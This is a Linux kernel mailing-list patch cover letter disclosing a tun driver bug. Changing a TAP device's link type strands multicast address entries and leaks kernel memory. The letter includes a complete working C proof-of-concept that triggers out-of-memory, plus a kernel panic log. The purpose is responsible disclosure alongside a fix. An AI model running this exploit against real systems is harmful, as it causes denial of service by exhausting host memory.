Received: from mail-pf1-f179.google.com (mail-pf1-f179.google.com [209.85.210.179])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 9083A2848BE
	for <netdev@vger.kernel.org>; Sat, 29 Aug 2026 10:23:36 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.210.179
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1787999018; cv=none; b=eS/pNwsaScPZiXy2wMRP9j48s9DmeVaLtOPEOpM8JdkZLSvU7S63GPoh4hP3AG8VFbqAPWlQwNHqKg11bhJCUCMOP0iCmjZM3zhnpGa91/uB0IHbVZXjFCP4XxPxHcPD1wdbYTaoXK9Tic2N5ZJsdhAdn+UiHDH5LHT2Y9qNSvM=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1787999018; c=relaxed/simple;
	bh=BWppXdud9sf/Oaw+RCg124Og528PvRG+mQhnLLZVQPE=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=BOMT7OFH26U2i+OLz3hojxPEwj5M6sDxOt041uTzNKEqtpiX1F4wq5WWc6KKKIxx5BRxs7zl+QVTprnxVz11lKraRsJNkFTAqPigdwfGaMPgoUO6LWdx1FuOkG+nduresUJ2ipg2E3nYNvW0zuNvayezwalMu9YBFSyGhuwTjCA=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=blenuI/0; arc=none smtp.client-ip=209.85.210.179
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="blenuI/0"
Received: by mail-pf1-f179.google.com with SMTP id d2e1a72fcca58-8534d507f59so1973913b3a.0
        for <netdev@vger.kernel.org>; Sat, 29 Aug 2026 03:23:36 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1787999016; x=1788603816; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=+DhVGGpUmcCMfVxXetZo3ylCGucNSWO0hfzgWZoMlIM=;
        b=blenuI/0EIkVCGn9GV7Q+WPGhnfHkANeLq9ms3JiLDeteMerEEtc6KnCWiZd0xSuEA
         SUI7wTQwZIYlr9KHIEpzEAM15daV55HM9aCCOviazmj8MBVor+Jag0WNyOzfYAiUnyuz
         9s3fhWTB9xfm596ZWwctG7WV60y2+Aivod5VUVGbNi3B02rY25fuCF5OTUrqHEyJCdHt
         2p1Rp4t2/pQ4kBteZqZnwy4KgD0Wn1R+hEsMt4ezZicc8/0gZgPJqp6xdjAzTENPn428
         W3dV+vlAEKmut7jD4aNpSuIRmRsiwqiFYwJcTgcu6BSvCOifA62BunZ3Y3+CqX/YPQK5
         rmmw==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1787999016; x=1788603816;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=+DhVGGpUmcCMfVxXetZo3ylCGucNSWO0hfzgWZoMlIM=;
        b=s7lH8Sr0SFRyFsFwrPGpsxdzPdedp/9P0j3nuoawH8zaL2KrjdYHId9yMq8Z9gaUok
         VP3+4OTij1Q+HnIwTjnSJVN84gGdsdK2JMqAOVm88StwjnqsGD4OKlQWWo2jrRxK0D1+
         0BQTpTvG69bTNI9aAJtSvYo00dgHyTDtQtvsqF7GJXil0wauk0cKQmgocdFG4dkyhwNy
         S+GriSQ0xQT8ivPeTRPjsnMfpvk9+HKVEiBA/3NXRhTxl5CTpNW7JRJag98xUR/1eu2N
         mNybEbETD0XsTc/qIZPlDM92lMchJagSWuGT1UrAFHg8Um3AOyXmnEYV9QeWKDbUf4lF
         q06Q==
X-Gm-Message-State: AFuF++nJiKxOy6JzsRP7fXu/NQ4iw5tgLZP3vIFYynQe8VsgwyZTLgCN
	jRNSQjWj0TUbnKg93/rodAtPaLk+xGuAqV1tsX7rckgMo9j4/wsqtwk0r4kWmai7gPnssuhJosG
	5u19f1pzY
X-Gm-Gg: AR+sD11XddXCY8iOdsw7J94udNsPtdeXirYIzW6ETb4abd1fmtqeXotjePmQrGkmM3M
	r1G4AUuAoKAEu0w34DiIcthd0z9R1ii0tTx2Kuw+cbdtOtSKB9E6jFXcHBcZQPqwu6BZwnhewHi
	wRQfs4NVhMFK6x2pFbsuLa/VX985Tz7HWPcryEO3RSqq2qk0d1wFtLpnwnYpTxfmei9UiUgLVto
	9LFWzEURe3ExtMP6rrdxOcqrSDxQeYGrKcZvrD48HwHqiFEgMHvU1oK+c9c+mAUeUYXJy0SxKxn
	aBhzPdpYB9jnCfkvdALclJVsYrmyRR4mmwL8ZUc4uIq3MYggnSUdiIlTgcFG76FSO8zcodbPjMV
	TDryhQLL9mfXdq5Xl6siDuD3OS0+507lAvWA/LRkkoOpWJkHZoc36/ldYTBNZp5gCYRLQxiSvEd
	GMqtrz1cnh+VcnYp1TRKGSI06WVfb1+KXlC7kr9FKYAuO5iFhdyTtvXXt+vM2GomEEe3s3
X-Received: by 2002:a05:6a20:eed2:10b0:3d3:1afc:bf0e with SMTP id adf61e73a8af0-3d31afcc685mr11655526637.7.1787999015640;
        Sat, 29 Aug 2026 03:23:35 -0700 (PDT)
Received: from Roxy.localdomain ([2602:feda:30:ae86:295:dff:fe84:68f4])
        by smtp.gmail.com with ESMTPSA id 5a478bee46e88-3286f959575sm13858193eec.15.2026.08.29.03.23.32
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Sat, 29 Aug 2026 03:23:34 -0700 (PDT)
From: Zhiling Zou <zhilinz@nebusec.ai>
To: netdev@vger.kernel.org
Cc: willemdebruijn.kernel@gmail.com,
	jasowangio@gmail.com,
	andrew+netdev@lunn.ch,
	davem@davemloft.net,
	edumazet@google.com,
	pabeni@redhat.com,
	phil@philpotter.co.uk,
	vega@nebusec.ai,
	zhilinz@nebusec.ai
Subject: [PATCH net 0/1] net: tun: reject addr_len changes with active lists
Date: Sat, 29 Aug 2026 18:23:22 +0800
Message-ID: <cover.1787998545.git.zhilinz@nebusec.ai>
X-Mailer: git-send-email 2.43.0
Precedence: bulk
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

Hi Linux kernel maintainers,

We found and validated an issue in drivers/net/tun.c. A user with
network-namespace administration privileges can create a TAP device,
add packet multicast memberships, change its link type with TUNSETLINK,
and then release the memberships. If the link type changes addr_len,
the kernel can strand netdev_hw_addr entries and allow unbounded kernel
memory growth.

We will provide detailed information about the bug
in this email, along with a PoC to trigger it.

---- details below ----

Bug details:

TUNSETLINK updates dev->addr_len when changing the link type. The
device address lists are keyed using the current addr_len, but their
entries do not retain the length used at insertion. A TAP device starts
with ARPHRD_ETHER and a six-byte address length. After a packet socket
adds a multicast membership, changing the device to ARPHRD_NONE changes
addr_len to zero. packet_dev_mc() then rejects cleanup because the
saved membership length no longer matches dev->addr_len. packet_mc_drop()
and packet_flush_mclist() discard their ownership records even when
dev_mc_del() fails, leaving the netdev_hw_addr entry allocated in the
device multicast list until unregister. Repeating with unique addresses
can exhaust kernel memory.

The fix rejects link-type changes that alter addr_len while either the
unicast or multicast address list is non-empty. Same-length type changes
remain allowed, and the check runs before type-change notifiers.

Reproducer:

    gcc -O2 -Wall -Wextra -o poc poc.c
    unshare -Urn ./poc -n 1 -b 1 -c drop -d 8

We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.

------BEGIN poc.c------

    #define _GNU_SOURCE

    #include <arpa/inet.h>
    #include <errno.h>
    #include <fcntl.h>
    #include <linux/if_arp.h>
    #include <linux/if_ether.h>
    #include <linux/if_packet.h>
    #include <linux/if_tun.h>
    #include <linux/sockios.h>
    #include <stdbool.h>
    #include <stdint.h>
    #include <stdio.h>
    #include <stdlib.h>
    #include <string.h>
    #include <sys/ioctl.h>
    #include <sys/socket.h>
    #include <unistd.h>

    enum cleanup_mode {
    	CLEANUP_DROP = 0,
    	CLEANUP_CLOSE = 1,
    };

    struct options {
    	char ifname[IFNAMSIZ];
    	uint32_t total_leaks;
    	uint32_t batch_size;
    	uint32_t report_every;
    	unsigned int dump_limit;
    	unsigned int hold_seconds;
    	enum cleanup_mode cleanup;
    };

    struct scan_result {
    	uint32_t iface_lines;
    	uint32_t target_lines;
    };

    static void usage(const char *prog)
    {
    	fprintf(stderr,
    		"Usage: %s [-i ifname] [-n total] [-b batch] [-r report_every] "
    		"[-d dump_limit] [-H hold_seconds] [-c drop|close]\n",
    		prog);
    }

    static int parse_u32(const char *arg, uint32_t *out)
    {
    	char *end = NULL;
    	unsigned long value;

    	errno = 0;
    	value = strtoul(arg, &end, 0);
    	if (errno || !end || *end || value > UINT32_MAX)
    		return -1;

    	*out = (uint32_t)value;
    	return 0;
    }

    static void make_addr(uint32_t index, unsigned char addr[ETH_ALEN])
    {
    	addr[0] = 0x01;
    	addr[1] = 0xaa;
    	addr[2] = (index >> 24) & 0xff;
    	addr[3] = (index >> 16) & 0xff;
    	addr[4] = (index >> 8) & 0xff;
    	addr[5] = index & 0xff;
    }

    static void addr_to_hex(const unsigned char addr[ETH_ALEN], char hex[ETH_ALEN * 2 + 1])
    {
    	snprintf(hex, ETH_ALEN * 2 + 1, "%02x%02x%02x%02x%02x%02x",
    		 addr[0], addr[1], addr[2], addr[3], addr[4], addr[5]);
    }

    static int create_tap(char ifname[IFNAMSIZ])
    {
    	struct ifreq ifr;
    	int fd;

    	fd = open("/dev/net/tun", O_RDWR);
    	if (fd < 0) {
    		perror("open(/dev/net/tun)");
    		return -1;
    	}

    	memset(&ifr, 0, sizeof(ifr));
    	snprintf(ifr.ifr_name, IFNAMSIZ, "%s", ifname);
    	ifr.ifr_flags = IFF_TAP | IFF_NO_PI;

    	if (ioctl(fd, TUNSETIFF, &ifr) < 0) {
    		perror("ioctl(TUNSETIFF)");
    		close(fd);
    		return -1;
    	}

    	snprintf(ifname, IFNAMSIZ, "%s", ifr.ifr_name);
    	return fd;
    }

    static int set_link_type(int tun_fd, unsigned int type)
    {
    	if (ioctl(tun_fd, TUNSETLINK, (void *)(uintptr_t)type) < 0) {
    		perror("ioctl(TUNSETLINK)");
    		return -1;
    	}

    	return 0;
    }

    static int open_packet_socket(void)
    {
    	int fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));

    	if (fd < 0)
    		perror("socket(AF_PACKET)");
    	return fd;
    }

    static int get_ifindex(const char *ifname)
    {
    	struct ifreq ifr;
    	int fd;
    	int ret = -1;

    	fd = socket(AF_INET, SOCK_DGRAM, 0);
    	if (fd < 0) {
    		perror("socket(AF_INET)");
    		return -1;
    	}

    	memset(&ifr, 0, sizeof(ifr));
    	snprintf(ifr.ifr_name, IFNAMSIZ, "%s", ifname);

    	if (ioctl(fd, SIOCGIFINDEX, &ifr) < 0)
    		perror("ioctl(SIOCGIFINDEX)");
    	else
    		ret = ifr.ifr_ifindex;

    	close(fd);
    	return ret;
    }

    static int packet_membership(int sock_fd, int optname, int ifindex,
    			     const unsigned char addr[ETH_ALEN])
    {
    	struct packet_mreq mreq;

    	memset(&mreq, 0, sizeof(mreq));
    	mreq.mr_ifindex = ifindex;
    	mreq.mr_type = PACKET_MR_MULTICAST;
    	mreq.mr_alen = ETH_ALEN;
    	memcpy(mreq.mr_address, addr, ETH_ALEN);

    	if (setsockopt(sock_fd, SOL_PACKET, optname, &mreq, sizeof(mreq)) < 0) {
    		perror(optname == PACKET_ADD_MEMBERSHIP ?
    		       "setsockopt(PACKET_ADD_MEMBERSHIP)" :
    		       "setsockopt(PACKET_DROP_MEMBERSHIP)");
    		return -1;
    	}

    	return 0;
    }

    static struct scan_result scan_dev_mcast(const char *ifname, unsigned int dump_limit)
    {
    	FILE *fp;
    	char line[512];
    	unsigned int dumped = 0;
    	struct scan_result result = { 0 };

    	fp = fopen("/proc/net/dev_mcast", "r");
    	if (!fp) {
    		perror("fopen(/proc/net/dev_mcast)");
    		return result;
    	}

    	while (fgets(line, sizeof(line), fp)) {
    		if (!strstr(line, ifname))
    			continue;

    		result.iface_lines++;
    		if (strstr(line, "01aa")) {
    			result.target_lines++;
    			if (dumped < dump_limit) {
    				fputs(line, stdout);
    				dumped++;
    			}
    		}
    	}

    	fclose(fp);
    	return result;
    }

    static long long mem_available_kb(void)
    {
    	FILE *fp;
    	char key[64];
    	long long value;

    	fp = fopen("/proc/meminfo", "r");
    	if (!fp)
    		return -1;

    	while (fscanf(fp, "%63s %lld kB\n", key, &value) == 2) {
    		if (!strcmp(key, "MemAvailable:")) {
    			fclose(fp);
    			return value;
    		}
    	}

    	fclose(fp);
    	return -1;
    }

    static void report_progress(const char *stage, const char *ifname, uint32_t leaked,
    			    unsigned int dump_limit)
    {
    	struct scan_result scan = scan_dev_mcast(ifname, dump_limit);
    	long long mem_kb = mem_available_kb();

    	printf("[%s] leaked=%u iface_lines=%u tagged_lines=%u",
    	       stage, leaked, scan.iface_lines, scan.target_lines);
    	if (mem_kb >= 0)
    		printf(" MemAvailable=%lldkB", mem_kb);
    	putchar('\n');
    }

    static int run_batch(int tun_fd, int ifindex, uint32_t start, uint32_t count,
    		     enum cleanup_mode cleanup)
    {
    	unsigned char addr[ETH_ALEN];
    	int sock_fd;
    	uint32_t i;

    	sock_fd = open_packet_socket();
    	if (sock_fd < 0)
    		return -1;

    	for (i = 0; i < count; i++) {
    		make_addr(start + i, addr);
    		if (packet_membership(sock_fd, PACKET_ADD_MEMBERSHIP, ifindex, addr) < 0) {
    			close(sock_fd);
    			return -1;
    		}
    	}

    	if (set_link_type(tun_fd, ARPHRD_NONE) < 0) {
    		close(sock_fd);
    		return -1;
    	}

    	if (cleanup == CLEANUP_DROP) {
    		for (i = 0; i < count; i++) {
    			make_addr(start + i, addr);
    			if (packet_membership(sock_fd, PACKET_DROP_MEMBERSHIP, ifindex, addr) < 0) {
    				close(sock_fd);
    				return -1;
    			}
    		}
    	}

    	close(sock_fd);

    	if (set_link_type(tun_fd, ARPHRD_ETHER) < 0)
    		return -1;

    	return 0;
    }

    static int parse_args(int argc, char **argv, struct options *opts)
    {
    	int c;

    	memset(opts, 0, sizeof(*opts));
    	strncpy(opts->ifname, "tapk3v%d", IFNAMSIZ - 1);
    	opts->total_leaks = 1;
    	opts->batch_size = 1;
    	opts->report_every = 1;
    	opts->dump_limit = 8;
    	opts->cleanup = CLEANUP_DROP;

    	while ((c = getopt(argc, argv, "b:c:d:H:i:n:r:h")) != -1) {
    		switch (c) {
    		case 'b':
    			if (parse_u32(optarg, &opts->batch_size) < 0 || !opts->batch_size)
    				return -1;
    			break;
    		case 'c':
    			if (!strcmp(optarg, "drop"))
    				opts->cleanup = CLEANUP_DROP;
    			else if (!strcmp(optarg, "close"))
    				opts->cleanup = CLEANUP_CLOSE;
    			else
    				return -1;
    			break;
    		case 'd':
    			if (parse_u32(optarg, &opts->dump_limit) < 0)
    				return -1;
    			break;
    		case 'H':
    			if (parse_u32(optarg, &opts->hold_seconds) < 0)
    				return -1;
    			break;
    		case 'i':
    			strncpy(opts->ifname, optarg, IFNAMSIZ - 1);
    			opts->ifname[IFNAMSIZ - 1] = '\0';
    			break;
    		case 'n':
    			if (parse_u32(optarg, &opts->total_leaks) < 0 || !opts->total_leaks)
    				return -1;
    			break;
    		case 'r':
    			if (parse_u32(optarg, &opts->report_every) < 0 || !opts->report_every)
    				return -1;
    			break;
    		case 'h':
    			usage(argv[0]);
    			exit(0);
    		default:
    			return -1;
    		}
    	}

    	if (opts->batch_size > opts->total_leaks)
    		opts->batch_size = opts->total_leaks;

    	return 0;
    }

    int main(int argc, char **argv)
    {
    	struct options opts;
    	unsigned char addr[ETH_ALEN];
    	char addr_hex[ETH_ALEN * 2 + 1];
    	uint32_t leaked = 0;
    	uint32_t batch_no = 0;
    	int tun_fd;
    	int ifindex;

    	setvbuf(stdout, NULL, _IONBF, 0);

    	if (parse_args(argc, argv, &opts) < 0) {
    		usage(argv[0]);
    		return 1;
    	}

    	tun_fd = create_tap(opts.ifname);
    	if (tun_fd < 0)
    		return 1;

    	ifindex = get_ifindex(opts.ifname);
    	if (ifindex < 0) {
    		close(tun_fd);
    		return 1;
    	}

    	make_addr(0, addr);
    	addr_to_hex(addr, addr_hex);

    	printf("iface=%s ifindex=%u cleanup=%s total=%u batch=%u report_every=%u first_tag=%s\n",
    	       opts.ifname, ifindex,
    	       opts.cleanup == CLEANUP_DROP ? "drop" : "close",
    	       opts.total_leaks, opts.batch_size, opts.report_every, addr_hex);
    	report_progress("initial", opts.ifname, 0, opts.dump_limit);

    	while (leaked < opts.total_leaks) {
    		uint32_t count = opts.total_leaks - leaked;

    		if (count > opts.batch_size)
    			count = opts.batch_size;

    		if (run_batch(tun_fd, ifindex, leaked, count, opts.cleanup) < 0) {
    			fprintf(stderr, "batch starting at %u failed\n", leaked);
    			close(tun_fd);
    			return 1;
    		}

    		leaked += count;
    		batch_no++;

    		if (batch_no % opts.report_every == 0 || leaked == opts.total_leaks)
    			report_progress("post-batch", opts.ifname, leaked, opts.dump_limit);
    	}

    	if (opts.hold_seconds) {
    		printf("holding tap open for %u seconds\n", opts.hold_seconds);
    		sleep(opts.hold_seconds);
    	}

    	close(tun_fd);
    	return 0;
    }


------END poc.c--------

----BEGIN crash log----

[ 1869.152735][T11408] Kernel panic - not syncing: Out of memory: compulsory panic_on_oom is enabled
[ 1869.153464][T11408] CPU: 0 UID: 0 PID: 11408 Comm: poc Not tainted 6.12.95 #2
[ 1869.153947][T11408] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[ 1869.154724][T11408] Call Trace:
[ 1869.154939][T11408]  <TASK>
[ 1869.155135][T11408]  panic+0x533/0x610
[ 1869.155420][T11408]  ? dump_header+0x5d2/0x800
[ 1869.155736][T11408]  ? __pfx_panic+0x10/0x10
[ 1869.156073][T11408]  out_of_memory+0x73c/0x1430
[ 1869.156399][T11408]  ? __alloc_pages_noprof+0xd53/0x26d0
[ 1869.156756][T11408]  ? __pfx_out_of_memory+0x10/0x10
[ 1869.157099][T11408]  ? lock_acquire+0x2f/0xb0
[ 1869.157400][T11408]  ? __alloc_pages_noprof+0xd53/0x26d0
[ 1869.157813][T11408]  __alloc_pages_noprof+0x1ecc/0x26d0
[ 1869.158157][T11408]  ? __pfx_mark_lock+0x10/0x10
[ 1869.158488][T11408]  ? __pfx___alloc_pages_noprof+0x10/0x10
[ 1869.158924][T11408]  ? __pfx_vmap_small_pages_range_noflush+0x10/0x10
[ 1869.159368][T11408]  ? irqentry_exit+0x3b/0x90
[ 1869.159672][T11408]  ? srso_alias_return_thunk+0x5/0xfbef5
[ 1869.160035][T11408]  ? lockdep_hardirqs_on+0x7b/0x110
[ 1869.160394][T11408]  alloc_pages_mpol_noprof+0x1ab/0x4d0
[ 1869.160774][T11408]  ? __pfx_alloc_pages_mpol_noprof+0x10/0x10
[ 1869.161179][T11408]  ? srso_alias_return_thunk+0x5/0xfbef5
[ 1869.161539][T11408]  ? srso_alias_return_thunk+0x5/0xfbef5
[ 1869.161913][T11408]  ? __pfx___might_resched+0x10/0x10
[ 1869.162266][T11408]  __vmalloc_node_range_noprof+0x584/0x1090
[ 1869.162663][T11408]  ? seq_read_iter+0x379/0x11f0
[ 1869.162998][T11408]  ? __pfx___vmalloc_node_range_noprof+0x10/0x10
[ 1869.163400][T11408]  ? rcu_is_watching+0x12/0xc0
[ 1869.163732][T11408]  ? srso_alias_return_thunk+0x5/0xfbef5
[ 1869.164094][T11408]  ? rcu_is_watching+0x12/0xc0
[ 1869.164404][T11408]  ? srso_alias_return_thunk+0x5/0xfbef5
[ 1869.164768][T11408]  ? trace_kmalloc+0x2b/0xe0
[ 1869.165064][T11408]  ? srso_alias_return_thunk+0x5/0xfbef5
[ 1869.165416][T11408]  ? __kmalloc_node_noprof+0x20e/0x430
[ 1869.165775][T11408]  ? seq_read_iter+0x379/0x11f0
[ 1869.166096][T11408]  __kvmalloc_node_noprof+0xb8/0xe0
[ 1869.166433][T11408]  ? seq_read_iter+0x379/0x11f0
[ 1869.166755][T11408]  seq_read_iter+0x379/0x11f0
[ 1869.167074][T11408]  ? srso_alias_return_thunk+0x5/0xfbef5
[ 1869.167438][T11408]  seq_read+0x2b1/0x450
[ 1869.167714][T11408]  ? __pfx_seq_read+0x10/0x10
[ 1869.168020][T11408]  ? srso_alias_return_thunk+0x5/0xfbef5
[ 1869.168388][T11408]  ? __pfx___lock_acquire+0x10/0x10
[ 1869.168750][T11408]  ? srso_alias_return_thunk+0x5/0xfbef5
[ 1869.169108][T11408]  ? srso_alias_return_thunk+0x5/0xfbef5
[ 1869.169476][T11408]  proc_reg_read+0x1ad/0x280
[ 1869.169788][T11408]  vfs_read+0x1be/0xb20
[ 1869.170057][T11408]  ? __might_fault+0xb6/0x120
[ 1869.170358][T11408]  ? __pfx_lock_release+0x10/0x10
[ 1869.170695][T11408]  ? __pfx_vfs_read+0x10/0x10
[ 1869.170997][T11408]  ? __might_fault+0xb6/0x120
[ 1869.171304][T11408]  ? srso_alias_return_thunk+0x5/0xfbef5
[ 1869.171668][T11408]  ? rcu_is_watching+0x12/0xc0
[ 1869.171982][T11408]  ? srso_alias_return_thunk+0x5/0xfbef5
[ 1869.172348][T11408]  ? __rseq_handle_notify_resume+0x825/0xc80
[ 1869.172783][T11408]  ksys_read+0xfb/0x1d0
[ 1869.173050][T11408]  ? __pfx_ksys_read+0x10/0x10
[ 1869.173356][T11408]  ? srso_alias_return_thunk+0x5/0xfbef5
[ 1869.173741][T11408]  do_syscall_64+0xc7/0x270
[ 1869.174044][T11408]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
[ 1869.174424][T11408] RIP: 0033:0x7f17b28e3687
[ 1869.174718][T11408] Code: 48 89 fa 4c 89 df e8 58 b3 00 00 8b 93 08 03 00 00 59 5e 48 83 f8 fc 74 1a 5b c3 0f 1f 84 00 00 00 00 00 48 8b 44 24 10 0f 05 <5b> c3 0f 1f 80 00 00 00 00 83 e2 39 83 fa 08 75 de e8 23 ff ff ff
[ 1869.175949][T11408] RSP: 002b:00007ffda6f2bc80 EFLAGS: 00000202 ORIG_RAX: 0000000000000000
[ 1869.176475][T11408] RAX: ffffffffffffffda RBX: 00007f17b2851740 RCX: 00007f17b28e3687
[ 1869.176987][T11408] RDX: 0000000000000400 RSI: 00005561f728c480 RDI: 0000000000000004
[ 1869.177495][T11408] RBP: 00007f17b2a38030 R08: 0000000000000000 R09: 0000000000000000
[ 1869.178011][T11408] R10: 0000000000000000 R11: 0000000000000202 R12: 00007f17b2a37ee0
[ 1869.178523][T11408] R13: 00005561f728c6a8 R14: 00000000000001ff R15: 00005561f728c2a0
[ 1869.179061][T11408]  </TASK>
[ 1869.180166][T11408] Kernel Offset: disabled
[ 1869.180485][T11408] Rebooting in 86400 seconds..

-----END crash log-----

Best regards,
Zhiling Zou

Zhiling Zou (1):
  net: tun: reject addr_len changes with active lists

 drivers/net/tun.c | 4 ++++
 1 file changed, 4 insertions(+)

-- 
2.43.0
